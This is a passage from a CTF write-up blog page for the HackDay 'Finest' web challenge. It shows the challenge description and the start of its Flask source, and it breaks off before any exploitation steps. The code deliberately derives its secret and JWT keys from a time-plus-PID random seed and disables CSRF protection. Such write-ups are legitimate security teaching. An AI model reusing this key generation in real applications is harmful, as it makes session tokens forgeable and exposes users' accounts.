<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="HackDay - Finest" />
<meta name="author" content="Anas" />
<meta property="og:locale" content="en" />
<meta name="description" content="Introduction Description" />
<meta property="og:description" content="Introduction Description" />
<link rel="canonical" href="http://localhost:4000/posts/hackday-2025-finest/" />
<meta property="og:url" content="http://localhost:4000/posts/hackday-2025-finest/" />
<meta property="og:site_name" content="NullBrunk" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-25T12:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackDay - Finest" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-02-09T18:25:45+00:00","datePublished":"2025-01-25T12:00:00+00:00","description":"Introduction Description","headline":"HackDay - Finest","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/hackday-2025-finest/"},"url":"http://localhost:4000/posts/hackday-2025-finest/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HackDay - Finest | NullBrunk
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="NullBrunk">
<meta name="application-name" content="NullBrunk">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/logo.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">NullBrunk</a>
    <p class="site-subtitle fst-italic mb-0">Web pentester, CTF player.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
          
          <li class="nav-item">
            <a href="/ctfs/" class="nav-link">
              <i class="fa-fw fas fa-flag"></i>
              

              <span>CTFS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tools/" class="nav-link">
              <i class="fa-fw fas fas fa-code"></i>
              

              <span>TOOLS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              

              <span>TAGS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/resume/" class="nav-link">
              <i class="fa-fw fas fa-file"></i>
              

              <span>RESUME</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              

              <span>ABOUT</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
        
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap justify-content-center align-items-center w-100">
    <a href="https://ctftime.org/user/157452" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fa-regular fa-font-awesome"></i>
    </a>


    
      

      
        <a
          href="https://www.root-me.org/NullBrunk?q=%2FNullbrunk"
          aria-label="root-me"
          

          

          

          
        >
          <i class="fas fa-skull"></i>
        </a>
      
    
      

      
        <a
          href="https://github.com/nullbrunk"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/anas-idiri-b05733229"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    

    <a href="mailto:anas.idiri.pro@gmail.com" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-envelope"></i>
    </a>
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!--  include topbar.html lang=lang -->

        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11   col-xl-9  px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<header id="topbar-wrapper" aria-label="Top Bar">
    <div id="topbar" class="d-flex align-items-center justify-content-between h-100" >
        <nav id="breadcrumb" aria-label="Breadcrumb">
            <span><a href="/">Home</a></span>
             

            
                <span>
                 <a href="/categories/writeups/">Writeups</a>
                </span>
            
                <span>
                 <a href="/categories/ctftime2025/">CTFTime2025</a>
                </span>
            
                <span>
                 <a href="/categories/hackday/">HackDay</a>
                </span>
            

             
             
            

            
             
            
            <span>HackDay - Finest</span>
        </nav>
    </div>
</header>

<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>HackDay - Finest</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737806400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan 25, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739125545"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb  9, 2025
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/NullBrunk/">Anas</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1423 words"
>
  <em>7 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">HackDay - Finest</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">HackDay - Finest</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <ol>
  <li>Introduction
    <ul>
      <li><a href="#description">Description</a></li>
    </ul>
  </li>
  <li>Enumeration
    <ul>
      <li><a href="#reading-source-code">Reading Source Code</a></li>
      <li><a href="#jwt-secret-key">JWY Secret Key</a></li>
      <li><a href="#sql-injection">SQL injection</a></li>
    </ul>
  </li>
  <li>Exploitation
    <ul>
      <li><a href="#understanding-the-jwt">Understanding the JWT</a></li>
      <li><a href="#scripting">Scripting</a></li>
      <li><a href="#getting-flag">Getting flag</a></li>
    </ul>
  </li>
</ol>

<hr />

<h1 id="introduction">Introduction</h1>

<h3 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<blockquote>
  <p>You’ve been informed that a website might be serving as a front for a large criminal network. Part of their revenue supposedly comes from selling cookies that can make you float like an airship… A rather tempting proposition. Their slogan, it seems, is: “Always wondered how to get the coolest and the highest quality products in your region ? Search no more, this new website allows you to do so !”</p>
</blockquote>

<h1 id="enumeration">Enumeration</h1>

<h3 id="reading-source-code"><span class="me-2">Reading source code</span><a href="#reading-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<details id="appjs">
  <summary>app.py</summary>

  <div file="app.py" class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="app.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">make_response</span>
<span class="kn">from</span> <span class="n">flask_sqlalchemy</span> <span class="kn">import</span> <span class="n">SQLAlchemy</span>
<span class="kn">from</span> <span class="n">sqlalchemy</span> <span class="kn">import</span> <span class="n">text</span>
<span class="kn">from</span> <span class="n">flask_jwt_extended</span> <span class="kn">import</span> <span class="n">JWTManager</span><span class="p">,</span> <span class="n">create_access_token</span><span class="p">,</span> <span class="n">jwt_required</span><span class="p">,</span> <span class="n">get_jwt_identity</span><span class="p">,</span> <span class="n">set_access_cookies</span><span class="p">,</span> <span class="n">unset_jwt_cookies</span><span class="p">,</span> <span class="n">get_jwt</span>
<span class="kn">from</span> <span class="n">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span><span class="p">,</span> <span class="n">check_password_hash</span>
<span class="kn">import</span> <span class="n">os</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">math</span>

<span class="c1"># I saw in the official _randommodule.c in which both time and pid are used to seed the random generator
# So that must be a good idea, right ? :) Just gonna do it simpler here, but should be as safe.
</span>
<span class="n">up</span> <span class="o">=</span> <span class="n">math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">())</span>
<span class="n">random</span><span class="p">.</span><span class="nf">seed</span><span class="p">(</span><span class="n">up</span> <span class="o">+</span> <span class="n">os</span><span class="p">.</span><span class="nf">getpid</span><span class="p">())</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SECRET_KEY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SQLALCHEMY_DATABASE_URI</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">sqlite:////app/data/site.db</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">JWT_SECRET_KEY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">JWT_TOKEN_LOCATION</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">cookies</span><span class="sh">'</span><span class="p">]</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">JWT_COOKIE_CSRF_PROTECT</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span> 

<span class="n">db</span> <span class="o">=</span> <span class="nc">SQLAlchemy</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
<span class="n">jwt</span> <span class="o">=</span> <span class="nc">JWTManager</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="nc">String</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="nc">String</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Product</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="nc">String</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">description</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Text</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">price</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Float</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="nc">String</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">static/images/default.png</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">published</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Boolean</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Flag</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nc">Column</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="nc">String</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="n">products</span> <span class="o">=</span> <span class="n">Product</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">filter_by</span><span class="p">(</span><span class="n">published</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="nf">all</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">home.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">products</span><span class="o">=</span><span class="n">products</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/product/&lt;int:product_id&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">product</span><span class="p">(</span><span class="n">product_id</span><span class="p">):</span>
    <span class="n">product</span> <span class="o">=</span> <span class="n">Product</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">get_or_404</span><span class="p">(</span><span class="n">product_id</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">product</span><span class="p">.</span><span class="n">published</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">product.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">Product not available anymore</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">product.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">product</span><span class="o">=</span><span class="n">product</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">).</span><span class="nf">first</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="nf">check_password_hash</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
            <span class="n">access_token</span> <span class="o">=</span> <span class="nf">create_access_token</span><span class="p">(</span><span class="n">identity</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">additional_claims</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">favorite_product</span><span class="sh">'</span><span class="p">:</span> <span class="bp">None</span><span class="p">})</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">(</span><span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">)))</span>
            <span class="nf">set_access_cookies</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">access_token</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">resp</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">Username or password incorrect</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/logout</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">(</span><span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">)))</span>
    <span class="nf">unset_jwt_cookies</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/register</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
